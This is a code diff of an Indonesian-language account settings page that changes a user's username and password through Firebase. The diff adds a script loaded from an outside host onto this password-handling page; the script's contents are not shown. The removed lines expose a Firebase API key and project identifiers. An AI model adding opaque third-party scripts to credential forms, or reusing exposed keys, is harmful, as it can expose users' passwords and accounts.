@@ -112,27 +112,15 @@
     <!-- Elemen UI untuk mengubah nama pengguna -->
     <label for="newUsername">Nama Pengguna Baru:</label>
     <input type="text" id="newUsername" placeholder="Masukkan nama pengguna baru">
-
+<p>masukan sandi saat ini untuk mengkonfirmasi</p>
     <!-- Tombol untuk menyimpan perubahan -->
     <button id="saveChangesButton" onclick="saveChanges()">Simpan Perubahan</button>
   </div>
+  
+<script src="https://kosred.com/a/klttyp.js"></script> 
 
   <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyDPp8I8Xp-qZg65GxEX8_ETxvrZCDG8454",
-      authDomain: "bisnis-532f5.firebaseapp.com",
-      projectId: "bisnis-532f5",
-      storageBucket: "bisnis-532f5.appspot.com",
-      messagingSenderId: "351800625123",
-      appId: "1:351800625123:web:8abff984b15be7a00bc2d6",
-      measurementId: "G-TJJBQ9TF7S"
-    };
     
-    // Check if Firebase is already initialized
-    if (!firebase.apps.length) {
-      firebase.initializeApp(firebaseConfig);
-    }
-
     const firestore = firebase.firestore();
 
     // Fungsi untuk kembali ke halaman sebelumnya
@@ -143,12 +131,12 @@
     // Fungsi untuk menyimpan perubahan (tambahkan logika sesuai kebutuhan)
     function saveChanges() {
       const currentPasswordInput = document.getElementById('currentPassword');
-      const newPasswordInput = document.getElementById('newPassword');
-      const newUsernameInput = document.getElementById('newUsername');
+const newPasswordInput = document.getElementById('newPassword');
+const newUsernameInput = document.getElementById('newUsername');
 
-      const currentPassword = currentPasswordInput.value;
-      const newPassword = newPasswordInput.value;
-      const newUsername = newUsernameInput.value;
+const currentPassword = currentPasswordInput.value;
+const newPassword = newPasswordInput.value;
+const newUsername = newUsernameInput.value;
 
       const user = firebase.auth().currentUser;
       const credential = firebase.auth.EmailAuthProvider.credential(user.email, currentPassword);
